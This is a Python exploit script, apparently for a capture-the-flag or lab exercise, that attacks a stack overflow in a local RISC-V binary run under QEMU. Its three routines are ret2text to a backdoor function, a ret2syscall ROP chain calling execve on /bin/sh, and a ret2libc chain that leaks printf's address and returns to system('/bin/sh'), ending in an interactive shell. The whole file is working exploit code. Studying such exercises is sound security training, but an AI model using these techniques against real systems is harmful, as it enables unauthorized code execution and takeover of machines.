from pwncli import *  # type: ignore # Add other required names explicitly

context.binary = './hello'

import argparse

parser = argparse.ArgumentParser(description='Exploit static binary with QEMU')
parser.add_argument('--debug', action='store_true', help='Run in debug mode')
args = parser.parse_args()

debug_flag = False

if args.debug:
    context.log_level = 'debug'
    gift.io = process(['qemu-riscv32', '-g', '1234', '-L', './lib','./hello'])
    debug_flag = True
else:
    context.log_level = 'debug'
    gift.io = process(['qemu-riscv32', '-L', './lib','./hello'])

gift.elf = ELF('./hello')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = ELF('./lib/lib/libc.so.6')

def ret2text():
    back_door = 0x105F8
    payload = flat([cyclic(0x20), p32(back_door)])
    
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2syscall():
    bin_sh = 0x10800
    lw_a0_a1_a2_ra_ret = 0x10620
    lw_a7_ra_ret = 0x1063C
    ecall = 0x1064C
    payload = flat([cyclic(0x20), 
                p32(lw_a0_a1_a2_ra_ret), 
                p32(bin_sh), p32(0), p32(0), 
                p32(lw_a7_ra_ret), 
                p32(221), p32(ecall)])
  
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2libc():
    printf_plt = elf.plt['printf']
    printf_got = elf.got['printf']
    start_addr = elf.sym['_start']
    lw_a0_a1_a2_ra_ret = 0x10620
    lw_t0_ra_jr_t0 = 0x10650
    payload_1 = flat([
        cyclic(0x20),
        p32(lw_a0_a1_a2_ra_ret),
        p32(printf_got),
        p32(0),           # a0
        p32(0),           # a1
        p32(lw_t0_ra_jr_t0),
        p32(printf_plt),  # t0
        p32(start_addr)   # ra Return to _start
    ])
    if debug_flag: pause()
    sa("Enter a string: ", payload_1)
    ru("\n")
    printf_addr = u32(r(4))
    libc.address = printf_addr - libc.sym['printf']
    log.success(f"printf address: {hex(printf_addr)}")
    log.success(f"libc base address: {hex(libc.address)}")
    log.success(f"system address: {hex(libc.sym['system'])}")
    log.success(f"/bin/sh address: {hex(next(libc.search(b'/bin/sh\x00')))}")
    if debug_flag: pause()
    payload_2 = flat([
        cyclic(0x20),
        p32(lw_a0_a1_a2_ra_ret),
        p32(next(libc.search(b'/bin/sh\x00'))),  # a0
        p32(0),
        p32(0),
        p32(libc.sym['system']),  # ra
    ])
    sa("Enter a string: ", payload_2)
    if debug_flag: pause()
    ru("\n")

if __name__ == "__main__":
    ret2libc()
    gift.io.interactive()